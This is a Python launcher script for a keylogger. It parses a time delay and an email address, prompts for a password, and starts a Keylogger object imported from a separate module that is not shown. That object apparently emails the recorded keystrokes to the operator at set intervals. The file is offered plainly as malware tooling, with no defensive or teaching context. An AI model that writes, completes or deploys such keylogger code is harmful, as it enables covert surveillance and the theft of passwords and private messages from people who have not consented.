#!/usr/bin/env python
import optparse
import keylogger
import subprocess

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--timeDelay", dest="t_delay", help=("Enter time delay in seconds"))
    parser.add_option("-u", "--username", dest="username", help=("Enter your emailId to get report on"))
    (options, arguments) = parser.parse_args()
    if not options.t_delay:
        print("[-] Please specify time delay, --help for more info")
    elif not options.username:
        print("[-] Please give emailId: ")
    return options

psswd = input("Enter password: ")
try:
    if __name__ == "__main__":
        my_keylogger = keylogger.Keylogger(int(get_arguments().t_delay), str(get_arguments().username), str(psswd))
        my_keylogger.start()
except KeyboardInterrupt:
    print("[-] CTRL+C detected......Exiting keylogger")
